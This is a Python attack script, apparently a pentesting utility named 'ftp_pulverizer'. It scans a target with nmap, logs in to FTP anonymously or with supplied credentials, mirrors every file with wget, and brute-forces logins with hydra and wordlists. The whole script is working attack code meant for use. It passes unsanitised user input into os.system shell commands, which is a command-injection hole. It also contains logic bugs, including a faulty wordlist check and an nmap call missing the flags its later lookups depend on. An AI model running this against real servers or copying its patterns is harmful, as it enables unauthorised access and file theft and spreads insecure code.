import os
import argparse
import nmap


parser = argparse.ArgumentParser(description="This is the ftp_pulverizer")
parser.add_argument("-t", "--target", type=str, help="Choose a target/host")
parser.add_argument("-p", "--port", type=int, help="Choose a port")
parser.add_argument("-f", "--filename", type=str, help="Choose an python-nmap class object file") # Legacy argument
args, unknown = parser.parse_known_args()

ftp_scan = nmap.PortScanner()
ftp_scan.scan(args.target, arguments=f"-p {args.port} ")


# run this function if anon login is found by nmap
def ftp_enum_anon():

    while True:
        
        # Print a quick summary
        print(f"Found FTP protocol on {args.target}, port {args.port}. State: {ftp_scan[str(args.target)]['tcp'][args.port]['state']}")
        print(f"Product: {ftp_scan[str(args.target)]['tcp'][args.port]['product']}")
        print(f"Version: {ftp_scan[str(args.target)]['tcp'][args.port]['version']}")
        print(f"CPE: {ftp_scan[str(args.target)]['tcp'][args.port]['cpe']}")
        
        try:
            choice = input(f"""\nAnyonymous FTP login found on {args.target}, port {args.port}!
[1] Login and automatically download all files.
[2] Login, do not automatically download files.
[3] Attempt to login with a specified username and password.
[4] Attempt to login with a specified username and password, automatically download all files.
[5] Brute force
[6] Exit
""")
            # Choice 1 - download all files
            if choice.lower() == str(1):
                os.system(f"wget -m -nd ftp://anonymous:anonymous@{args.target}:{args.port} -P {args.target}_ftp")
                print(f"Files saved in new folder: {args.target}_ftp. View of directory:")
                os.system(f"ls -la {args.target}_ftp")

            # Choice 2 - just browsing 
            elif choice.lower() == str(2):
                os.system(f"ftp ftp://anonymous:anonymous@{args.target}:{args.port}")
            
            # Choice 3 - login with another username/password
            elif choice.lower() == str(3):
                username = input("Enter username\n")
                password = input("Enter password\n")
                os.system(f"ftp ftp://{username}:{password}@{args.target}:{args.port}")
            
            # Choice 4 - Login with another username/password and automatically download all files
            elif choice.lower() == str(4):
                username = input("Enter username\n")
                password = input("Enter password\n")
                os.system(f"wget -m -nd ftp://{username}:{password}@{args.target}:{args.port} -P {args.target}_ftp")
                print(f"Files saved in new folder: {args.target}_ftp. View of directory:")

            # Choice 5 - Run the brute force login function
            elif choice.lower() == str(5):
                brute_force()

            # Choice 6 - Break from the loop
            elif choice.lower() == str(6):
                break



            else:
                print("Invalid command")
        
        except:
            print("Something went wrong.")
 

# run this funtion if anonymous login is not found by nmap
def ftp_enum():

    while True:

        # Print a quick summary
        print(f"Found FTP protocol on {args.target}, port {args.port}. State: {ftp_scan[str(args.target)]['tcp'][args.port]['state']}")
        print(f"Product: {ftp_scan[str(args.target)]['tcp'][args.port]['product']}")
        print(f"Version: {ftp_scan[str(args.target)]['tcp'][args.port]['version']}")
        print(f"CPE: {ftp_scan[str(args.target)]['tcp'][args.port]['cpe']}")

        try:
            choice = input(f"""\nAnyonymous FTP login NOT found on {args.target}, port {args.port}.
[1] Attempt to login with a specified username and password.
[2] Attempt to login with a specified username and password, automatically download all files.
[3] Brute force
[4] Exit
""")

            # Choice 1 - try to login with specified username/password
            if choice.lower() == str(1):
                username = input("Enter username\n")
                password = input("Enter password\n")
                os.system(f"ftp ftp://{username}:{password}@{args.target}:{args.port}")
            
            # Choice 2 - try to login with specified username/password and dl all files
            elif choice.lower() == str(2):
                username = input("Enter username\n")
                password = input("Enter password\n")
                os.system(f"wget -m -nd ftp://{username}:{password}@{args.target}:{args.port} -P {args.target}_ftp")
                print(f"Files saved in new folder: {args.target}_ftp. View of directory:")

           # Choice 3 - brute force
            elif choice.lower() == str(3):
                brute_force()

            # Choice 4 - break from the loop
            elif choice.lower() == str(4):
                break

            else:
                print("Invalid command")
        except:
            print("Looks like something went wrong here. ")


# attempt to brute force the login
def brute_force():
    while True:
        print("\nBRUTE FORCE")
        username = input("Choose username or username wordlist:\n")
        if "." and "/" in username:
            user_is_wordlist = True
        else:
            user_is_wordlist = False      

        password = input("Choose password or password wordlist:\n")
        if "." and "/" in password:
            password_is_wordlist = True
        else:
            password_is_wordlist = False

        tasks = str(input("Choose number of tasks to run concurrently:\n"))  

        if user_is_wordlist is True and password_is_wordlist is True:
            os.system(f"hydra -t {tasks} -L {username} -P {password} -vV {args.target} -s {args.port} ftp")

        elif user_is_wordlist is True and password_is_wordlist is False:
            os.system(f"hydra -t {tasks} -L {username} -p {password} -vV {args.target} -s {args.port} ftp")

        elif user_is_wordlist is False and password_is_wordlist is False:
            os.system(f"hydra -t {tasks} -l {username} -p {password} -vV {args.target} -s {args.port} ftp")

        elif user_is_wordlist is False and password_is_wordlist is True:
            os.system(f"hydra -t {tasks} -l {username} -P {password} -vV {args.target} -s {args.port} ftp")

# Run the anonymous function if anonymous access is found by nmap
try:
    if "Anonymous FTP login allowed" in ftp_scan[str(args.target)]['tcp'][args.port]['script']['ftp-anon']:
        ftp_enum_anon()
except: 
    ftp_enum()

